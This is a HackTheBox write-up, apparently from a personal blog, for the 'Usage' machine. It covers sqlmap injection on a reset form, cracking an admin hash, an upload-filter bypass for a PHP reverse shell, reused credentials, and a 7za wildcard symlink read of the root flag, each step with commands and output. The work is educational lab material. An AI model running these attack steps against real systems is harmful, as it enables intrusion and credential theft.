<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: Usage HTB Write-Up</title>

    <meta property="og:title" content="Dawnless | Usage HTB Write-Up">
    <meta property="og:image" content="http://dawnl3ss.me/assets/img/ogimage.jpg">
    <meta property="og:description" content="Usage HackTheBox Write-Up by Dawnl3ss. SQLi + file upload bypass + 7za wildcard privesc.">
    <meta name="author" content="Dawnless">

    <link rel="icon" href="/public/img/icon.jpg" type="image/png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>
            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
                <li><a href="#privesc" class="nav-link">PrivEsc</a></li>
            </ul>
            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>Usage</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://labs.hackthebox.com/storage/avatars/23e804513a47e8f20bc865d0419946e1.png"
                alt="Usage HTB"
            >
            <div class="writeup-meta">
                <h1>HTB - <span>Usage</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-easy"><i class="mdi mdi-circle-slice-8"></i> Easy</span>
                    <span class="meta-badge os-linux"><i class="mdi mdi-linux"></i> Linux</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-web"></i> Web App</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> HackTheBox</span>
                </div>
                <div class="tag-list">
                    <span class="tag">ctf</span>
                    <span class="tag">boot2root</span>
                    <span class="tag">privesc</span>
                    <span class="tag">sqli</span>
                    <span class="tag">file-upload</span>
                    <span class="tag">python</span>
                    <span class="tag">wildcard</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Getting a Shell</a></li>
                <li><a href="#privesc"><i class="mdi mdi-crown-outline"></i> Privilege Escalation</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://app.hackthebox.com/machines/597" target="_blank">Usage</a> is an active machine on HackTheBox.
                The objective is to compromise the target and retrieve both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">Usage</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#22c55e">Easy</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-linux"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Linux</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-web"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Web App</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>After adding the machine IP to <code class="inline">/etc/hosts</code>, I ran a quick NMAP scan:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nmap scan</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
└──╼ [★]$</span> <span class="cmd">cat nmap_scan</span>
<span class="output">Nmap scan report for usage.htb (10.10.11.18)
PORT   STATE SERVICE
<span class="success">22/tcp open  ssh
80/tcp open  http</span>

Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds</span></pre>
            </div>

            <p>
                The webapp on port 80 has a login form and a password reset page.
                Manual SQLi testing on the login returned nothing, but the reset form looked more promising.
            </p>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/usage/web1.png" alt="Password reset form">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// usage.htb - password reset form</div>
            </div>

            <p>I captured the request with Burp Suite and passed it to sqlmap:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">sqlmap - database enumeration</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
└──╼ [★]$</span> <span class="cmd">sqlmap -r request -p 'email' --dbms=mysql --level=5 --risk=3 --technique=BUT --batch --dbs</span>
<span class="output">[12:16:31] [INFO] fetching database names
[12:16:32] [INFO] retrieved: information_schema
[12:16:52] [INFO] retrieved: performance_schema
<span class="success">[12:17:10] [INFO] retrieved: usage_blog</span>

available databases [3]:
[*] information_schema
[*] performance_schema
<span class="success">[*] usage_blog</span></span></pre>
            </div>

            <p>The <code class="inline">usage_blog</code> database looks interesting. Let's list its tables:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">sqlmap - table enumeration</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
└──╼ [★]$</span> <span class="cmd">sqlmap -r request -p 'email' --dbms=mysql --level=5 --risk=3 --technique=BUT --batch -D usage_blog --tables</span>
<span class="output">Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
<span class="success">| admin_users            |</span>
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+</span></pre>
            </div>

            <p>Dumping the <code class="inline">admin_users</code> table:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">sqlmap - dump admin_users</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
└──╼ [★]$</span> <span class="cmd">sqlmap -r request -p 'email' --dbms=mysql --level=5 --risk=3 --technique=BUT --batch -D usage_blog -T admin_users --dump</span>
<span class="output">Database: usage_blog
Table: admin_users
+----+---------------+--------------------------------------------------------------+----------+
| id | name          | password                                                     | username |
+----+---------------+--------------------------------------------------------------+----------+
<span class="success">| 1  | Administrator | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    |</span>
+----+---------------+--------------------------------------------------------------+----------+</span></pre>
            </div>

            <p>Cracking the bcrypt hash with John:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">john - bcrypt crack</span>
                    <button class="tb-copy" data-target="cmd5">copy</button>
                </div>
                <pre id="cmd5"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
└──╼ [★]$</span> <span class="cmd">echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > tojohn</span>
<span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
└──╼ [★]$</span> <span class="cmd">john tojohn --wordlist=/security/rockyou.txt</span>
<span class="output">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
<span class="success">whatever1        (?)</span>
1g 0:00:00:03 DONE</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-key-variant"></i>
                <p>Admin credentials found: <code class="inline">admin:whatever1</code></p>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/usage/panel2.png" alt="Admin panel login">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// admin.usage.htb - login page</div>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/usage/panel3.png" alt="Admin panel dashboard">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// admin.usage.htb - authenticated dashboard</div>
            </div>
        </section>

        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Getting a Shell</h2>
                </div>
            </div>

            <p>The admin panel allows uploading an avatar. I tried uploading a PHP reverse shell - direct upload was blocked, but renaming the file to <code class="inline">rev-shell.php.jpg</code> and then intercepting the request with Burp to append <code class="inline">.php</code> bypassed the restriction:</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/usage/panel4.png" alt="Avatar upload feature">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Admin panel - avatar upload</div>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/usage/burp5.png" alt="Burp Suite file upload bypass">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Burp Suite - appending .php to bypass extension filter</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">netcat - reverse shell</span>
                    <button class="tb-copy" data-target="cmd6">copy</button>
                </div>
                <pre id="cmd6"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Usage]
└──╼ [★]$</span> <span class="cmd">nc -lnvp 4444</span>
<span class="output">connect to [10.10.14.2] from (UNKNOWN) [10.10.11.18] 42914
uid=1000(dash) gid=1000(dash) groups=1000(dash)
$</span> <span class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
<span class="success">dash@usage:/$</span>

<span class="output">dash@usage:~$</span> <span class="cmd">cat user.txt</span>
<span class="success">...REDACTED...</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-flag"></i>
                <p><strong>User flag captured!</strong> Shell obtained as <strong>dash</strong>.</p>
            </div>
        </section>

        <section class="wt-section" id="privesc">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-crown-outline"></i></div>
                <div>
                    <span class="section-num">04 /</span>
                    <h2>Privilege Escalation</h2>
                </div>
            </div>

            <p>Dash has an <code class="inline">id_rsa</code> in <code class="inline">~/.ssh</code>. I used it for a stable SSH session, then enumerated the home directory:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">~/.monitrc - leaked credentials</span>
                    <button class="tb-copy" data-target="cmd7">copy</button>
                </div>
                <pre id="cmd7"><span class="output">dash@usage:~$</span> <span class="cmd">cat .monitrc</span>
<span class="output">set daemon  60
set httpd port 2812
     use address 127.0.0.1
<span class="success">     allow admin:3nc0d3d_pa$$w0rd</span>

check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert</span></pre>
            </div>

            <p>Password reuse - switching to <code class="inline">xander</code> works:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">su xander + sudo -l</span>
                    <button class="tb-copy" data-target="cmd8">copy</button>
                </div>
                <pre id="cmd8"><span class="output">dash@usage:~$</span> <span class="cmd">su xander</span>
<span class="output">Password: 3nc0d3d_pa$$w0rd
<span class="success">xander@usage:/home/dash$</span>

xander@usage:~$</span> <span class="cmd">sudo -l</span>
<span class="output">User xander may run the following commands on usage:
<span class="success">    (ALL : ALL) NOPASSWD: /usr/bin/usage_management</span></span></pre>
            </div>

            <p>I downloaded the binary and analyzed it in Ghidra:</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/usage/ghidra6.png" alt="Ghidra reverse engineering">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Ghidra - backupWebContent() calls /usr/bin/7za with a wildcard</div>
            </div>

            <div class="callout info">
                <i class="mdi mdi-lightbulb-outline"></i>
                <p>
                    The <code class="inline">backupWebContent()</code> function uses <code class="inline">/usr/bin/7za</code> with a wildcard on <code class="inline">/var/www/html</code>.
                    HackTricks documents a wildcard abuse for 7z that allows reading arbitrary files as the executing user.
                    Reference: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z" target="_blank">hacktricks.xyz - 7z wildcard</a>
                </p>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/usage/hacktrickz7.png" alt="HackTricks 7z wildcard technique">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// HackTricks - 7z wildcard file read exploit</div>
            </div>

            <p>Xander has full write access to <code class="inline">/var/www/html</code>. I created a symlink pointing to the root flag and a trigger file:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">7za wildcard exploit</span>
                    <button class="tb-copy" data-target="cmd9">copy</button>
                </div>
                <pre id="cmd9"><span class="output">xander@usage:/var/www/html$</span> <span class="cmd">touch @root.txt</span>
<span class="output">xander@usage:/var/www/html$</span> <span class="cmd">ln -s /root/root.txt root.txt</span>
<span class="output">xander@usage:/var/www/html$</span> <span class="cmd">ls -la</span>
<span class="output">-rw-rw-r-- 1 xander xander    0 May 13 17:18 <span class="warning">@root.txt</span>
lrwxrwxrwx 1 xander xander   14 May 13 17:18 <span class="success">root.txt -> /root/root.txt</span></span>

<span class="output">xander@usage:/var/www/html$</span> <span class="cmd">sudo /usr/bin/usage_management</span>
<span class="output">Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3):</span> <span class="cmd">1</span>
<span class="output">7-Zip (a) [64] 16.02

Scanning the drive:

WARNING: No more files
<span class="success">...ROOT FLAG CONTENT...</span>

Scan WARNINGS: 1</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Root flag captured!</strong> Box fully pwned via SQLi -> file upload bypass -> 7za wildcard read. 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>

<script src="/public/js/wtpage.js"></script>
</body>
</html>